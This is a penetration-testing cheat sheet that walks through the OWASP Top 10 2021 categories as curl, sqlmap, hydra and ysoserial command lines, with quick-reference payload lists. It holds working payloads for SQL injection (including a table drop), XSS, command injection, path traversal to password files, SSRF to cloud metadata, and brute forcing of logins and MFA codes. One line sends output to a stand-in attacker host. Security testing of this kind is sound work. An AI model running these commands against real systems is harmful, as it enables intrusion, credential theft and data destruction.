# OWASP Top 10 2021 — Detailed Test Cases

> *"Systematic testing. Every category. Every technique."*

## A01:2021 — Broken Access Control

### Description
Access control enforces policy such that users cannot act outside their intended permissions.

### Test Cases

#### IDOR (Insecure Direct Object Reference)
```bash
# Test user ID manipulation
curl "http://$TARGET/api/user/1" -H "Cookie: session=user2_token"
curl "http://$TARGET/api/user/2" -H "Cookie: session=user2_token"
curl "http://$TARGET/api/user/3" -H "Cookie: session=user2_token"

# Test document/file ID
curl "http://$TARGET/document?id=1"
curl "http://$TARGET/document?id=2"
curl "http://$TARGET/download?file=report_1.pdf"
curl "http://$TARGET/download?file=report_2.pdf"

# UUID manipulation
curl "http://$TARGET/api/order/550e8400-e29b-41d4-a716-446655440000"
```

#### Privilege Escalation
```bash
# Access admin endpoints as regular user
curl "http://$TARGET/admin" -H "Cookie: session=regular_user"
curl "http://$TARGET/api/admin/users" -H "Cookie: session=regular_user"

# Modify role in request
curl -X POST "http://$TARGET/api/user" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}' \
  -H "Cookie: session=regular_user"
```

#### Path Traversal
```bash
# File path traversal
curl "http://$TARGET/file?name=../../../etc/passwd"
curl "http://$TARGET/file?name=....//....//....//etc/passwd"
curl "http://$TARGET/file?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"

# Windows path traversal
curl "http://$TARGET/file?name=..\..\..\..\windows\system32\config\sam"
```

#### Forced Browsing
```bash
# Access hidden/unlinked resources
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak

# Access backup files
curl "http://$TARGET/config.php.bak"
curl "http://$TARGET/database.sql"
curl "http://$TARGET/.git/config"
```

### Tools
- Burp Suite Autorize extension
- Manual testing with curl
- ffuf for path discovery

---

## A02:2021 — Cryptographic Failures

### Description
Failures related to cryptography which often leads to sensitive data exposure.

### Test Cases

#### SSL/TLS Testing
```bash
# Test SSL/TLS configuration
testssl.sh $TARGET

# Check for weak ciphers
nmap --script ssl-enum-ciphers -p 443 $TARGET

# Check certificate
openssl s_client -connect $TARGET:443 -servername $TARGET
```

#### Sensitive Data Exposure
```bash
# Check for exposed credentials in response
curl "http://$TARGET/api/config" | grep -i "password\|api_key\|secret\|token"

# Check for sensitive data in HTML comments
curl "http://$TARGET" | grep "<!--.*password\|secret\|key.*-->"

# Check robots.txt and sitemap
curl "http://$TARGET/robots.txt"
curl "http://$TARGET/sitemap.xml"
```

#### Weak Encryption
```bash
# Check password storage (if accessible)
# Look for MD5/SHA1 without salt
# Look for reversible encryption
# Check for plaintext transmission
```

### Tools
- testssl.sh
- nmap ssl scripts
- Burp Suite

---

## A03:2021 — Injection

### Description
Injection flaws occur when untrusted data is sent to an interpreter.

### SQL Injection Test Cases

```bash
# Error-based
curl "http://$TARGET/page?id=1'"
curl "http://$TARGET/page?id=1\"
curl "http://$TARGET/page?id=1\`"

# Union-based
curl "http://$TARGET/page?id=1 UNION SELECT NULL--"
curl "http://$TARGET/page?id=1 UNION SELECT NULL,NULL--"
curl "http://$TARGET/page?id=1 UNION SELECT NULL,NULL,NULL--"

# Boolean-based blind
curl "http://$TARGET/page?id=1 AND 1=1--"
curl "http://$TARGET/page?id=1 AND 1=2--"

# Time-based blind
curl "http://$TARGET/page?id=1 AND SLEEP(5)--"
curl "http://$TARGET/page?id=1; WAITFOR DELAY '0:0:5'--"

# Automated testing
sqlmap -u "http://$TARGET/page?id=1" --batch --level=5 --risk=3
```

### XSS Test Cases

```bash
# Reflected XSS
curl "http://$TARGET/search?q=<script>alert(1)</script>"
curl "http://$TARGET/search?q=\"><script>alert(1)</script>"
curl "http://$TARGET/search?q='><script>alert(1)</script>"

# DOM-based XSS
# Check URL fragments and JavaScript sinks

# Stored XSS
curl -X POST "http://$TARGET/comment" -d "content=<script>alert(1)</script>"

# Filter bypass
curl "http://$TARGET/search?q=<img src=x onerror=alert(1)>"
curl "http://$TARGET/search?q=<svg/onload=alert(1)>"
curl "http://$TARGET/search?q=<body onload=alert(1)>"
```

### Command Injection Test Cases

```bash
# Basic command injection
curl "http://$TARGET/ping?host=127.0.0.1;whoami"
curl "http://$TARGET/ping?host=127.0.0.1|whoami"
curl "http://$TARGET/ping?host=127.0.0.1\`whoami\`"
curl "http://$TARGET/ping?host=\$(whoami)"

# Blind command injection (time-based)
curl "http://$TARGET/ping?host=127.0.0.1;sleep 5"
curl "http://$TARGET/ping?host=127.0.0.1|sleep 5"

# Out-of-band
curl "http://$TARGET/ping?host=127.0.0.1;curl http://attacker.com/\$(whoami)"
```

### LDAP Injection

```bash
curl "http://$TARGET/search?user=*"
curl "http://$TARGET/search?user=admin)(&)"
curl "http://$TARGET/search?user=*)(uid=*))(|(uid=*"
```

### Tools
- sqlmap
- dalfox/XSStrike
- commix
- tplmap

---

## A04:2021 — Insecure Design

### Description
A new category focusing on risks related to design and architectural flaws.

### Test Cases

#### Business Logic Flaws
```bash
# Price manipulation
curl -X POST "http://$TARGET/cart" -d "product=1&price=-100"
curl -X POST "http://$TARGET/cart" -d "product=1&quantity=-1"

# Coupon abuse
curl -X POST "http://$TARGET/coupon" -d "code=DISCOUNT&apply=multiple"

# Workflow bypass
# Skip steps in multi-step process
curl -X POST "http://$TARGET/checkout/step3" -d "payment=complete"
```

#### Race Conditions
```bash
# Use parallel requests
for i in {1..10}; do
  curl -X POST "http://$TARGET/redeem?coupon=ONCE" &
done
wait
```

#### Insufficient Rate Limiting
```bash
# Test for brute force protection
for i in {1..100}; do
  curl -X POST "http://$TARGET/login" -d "user=admin&pass=attempt$i"
done
```

### Tools
- Manual testing
- Burp Suite Turbo Intruder
- Custom scripts

---

## A05:2021 — Security Misconfiguration

### Description
Missing or incorrectly configured security hardening.

### Test Cases

#### Default Credentials
```bash
# Test default credentials
curl -X POST "http://$TARGET/admin/login" -d "user=admin&pass=admin"
curl -X POST "http://$TARGET/admin/login" -d "user=admin&pass=password"
curl -X POST "http://$TARGET/admin/login" -d "user=root&pass=root"
```

#### Error Messages
```bash
# Trigger detailed errors
curl "http://$TARGET/page?id='"
curl "http://$TARGET/file?name=../../../../../../etc/passwd"
curl "http://$TARGET/api/null"
```

#### Directory Listing
```bash
# Check for directory listing
curl "http://$TARGET/images/"
curl "http://$TARGET/uploads/"
curl "http://$TARGET/backup/"
```

#### Security Headers
```bash
# Check missing security headers
curl -I "http://$TARGET" | grep -E "X-Frame-Options|X-Content-Type|CSP|HSTS"
```

#### CORS Misconfiguration
```bash
# Test CORS
curl -H "Origin: http://evil.com" -I "http://$TARGET/api/data"
curl -H "Origin: null" -I "http://$TARGET/api/data"
```

### Tools
- nikto
- nuclei (misconfiguration templates)
- Manual review

---

## A06:2021 — Vulnerable and Outdated Components

### Description
Using components with known vulnerabilities.

### Test Cases

```bash
# Identify versions
curl "http://$TARGET" | grep -i "version\|powered by"
whatweb http://$TARGET

# Check JavaScript libraries
# Review page source for library versions

# Search for CVEs
searchsploit <component> <version>

# Automated scanning
retire.js
npm audit
```

### Tools
- retire.js
- Snyk
- OWASP Dependency-Check
- nuclei (CVE templates)

---

## A07:2021 — Identification and Authentication Failures

### Description
Flaws in authentication mechanisms.

### Test Cases

#### Password Testing
```bash
# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Password spray
hydra -L users.txt -p "Password123" $TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

#### Session Management
```bash
# Session fixation
# 1. Get session before auth
# 2. Authenticate
# 3. Check if session changed

# Session hijacking
# Check cookie security (HttpOnly, Secure, SameSite)

# Session timeout
# Test if session expires appropriately
```

#### Multi-Factor Bypass
```bash
# Skip MFA step
curl "http://$TARGET/dashboard" -H "Cookie: session=post_password_session"

# Brute force MFA codes
for i in {000000..999999}; do
  curl -X POST "http://$TARGET/mfa" -d "code=$i"
done
```

### Tools
- hydra
- Burp Suite
- Custom scripts

---

## A08:2021 — Software and Data Integrity Failures

### Description
Code and infrastructure that does not protect against integrity violations.

### Test Cases

#### Insecure Deserialization
```bash
# Java serialization
# Look for Base64 encoded objects starting with rO0

# PHP serialization
# Look for a:2:{s:...} patterns

# Use ysoserial for Java
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64

# Use phpggc for PHP
phpggc Laravel/RCE1 system 'whoami'
```

#### CI/CD Security
```bash
# Check for exposed .git
curl "http://$TARGET/.git/config"
curl "http://$TARGET/.git/HEAD"

# Check for exposed CI configs
curl "http://$TARGET/.github/workflows/"
curl "http://$TARGET/.gitlab-ci.yml"
curl "http://$TARGET/Jenkinsfile"
```

### Tools
- ysoserial
- phpggc
- Manual review

---

## A09:2021 — Security Logging and Monitoring Failures

### Description
Without logging and monitoring, breaches cannot be detected.

### Test Cases

```bash
# This is mainly a review/audit category
# Test if attacks generate alerts
# Review log retention
# Check for log injection
curl "http://$TARGET/login?user=admin%0aFake Log Entry"
```

---

## A10:2021 — Server-Side Request Forgery (SSRF)

### Description
SSRF flaws occur when a web application fetches a remote resource without validating the user-supplied URL.

### Test Cases

```bash
# Basic SSRF
curl "http://$TARGET/fetch?url=http://127.0.0.1"
curl "http://$TARGET/fetch?url=http://localhost"
curl "http://$TARGET/fetch?url=http://[::1]"

# Cloud metadata
curl "http://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://$TARGET/fetch?url=http://169.254.169.254/latest/user-data/"
curl "http://$TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"

# Internal network scanning
curl "http://$TARGET/fetch?url=http://192.168.1.1"
curl "http://$TARGET/fetch?url=http://10.0.0.1"

# Protocol smuggling
curl "http://$TARGET/fetch?url=file:///etc/passwd"
curl "http://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a\$4%0d%0aPING%0d%0a"

# Bypass techniques
curl "http://$TARGET/fetch?url=http://127.0.0.1.nip.io"
curl "http://$TARGET/fetch?url=http://0x7f000001"
curl "http://$TARGET/fetch?url=http://2130706433"
```

### Tools
- Manual testing
- Burp Collaborator
- SSRFmap
- nuclei (SSRF templates)

---

## Quick Reference Payloads

### SQLi
```
' OR '1'='1
" OR "1"="1
1 OR 1=1
1' AND '1'='1
1 UNION SELECT NULL--
1; DROP TABLE users--
```

### XSS
```html
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)
```

### Command Injection
```
; ls
| ls
`ls`
$(ls)
& whoami
|| whoami
```

### Path Traversal
```
../../../etc/passwd
....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
```

### SSRF
```
http://127.0.0.1
http://localhost
http://169.254.169.254
http://[::1]
http://0.0.0.0
```
